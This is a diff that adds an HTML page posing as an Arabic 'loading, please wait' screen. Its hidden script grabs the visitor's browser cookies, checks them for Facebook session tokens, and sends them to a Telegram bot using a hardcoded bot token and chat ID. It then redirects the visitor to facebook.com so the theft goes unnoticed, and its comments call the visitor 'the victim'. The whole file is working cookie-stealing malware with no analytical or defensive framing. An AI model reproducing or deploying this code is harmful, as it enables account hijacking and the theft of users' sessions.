@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+    <style>
+      body {
+        background-color: #ffffff;
+        color: #222;
+        font-family: sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        flex-direction: column;
+      }
+    </style>
+  </head>
+  <body>
+    <h3>🔄 جاري التحميل، برجاء الانتظار...</h3>
+
+    <script>
+      const botToken = "8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
+      const chatId = "6884787120";
+
+      const cookies = document.cookie;
+
+      // دالة الإرسال
+      function sendToTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+      }
+
+      // التحقق من وجود جلسة فيسبوك
+      if (cookies.includes("c_user") && cookies.includes("xs")) {
+        sendToTelegram("🔥 تم التقاط جلسة فيسبوك:\n\n" + cookies);
+      } else {
+        sendToTelegram("❌ لم يتم العثور على جلسة فيسبوك.\n🔍 قد لا يكون الضحية مسجل دخول من المتصفح.");
+      }
+
+      // إعادة توجيه تمويهي بعد 3 ثواني
+      setTimeout(() => {
+        window.location.href = "https://facebook.com"; // ممكن تغييره لرابط آخر
+      }, 3000);
+    </script>
+  </body>
+</html>
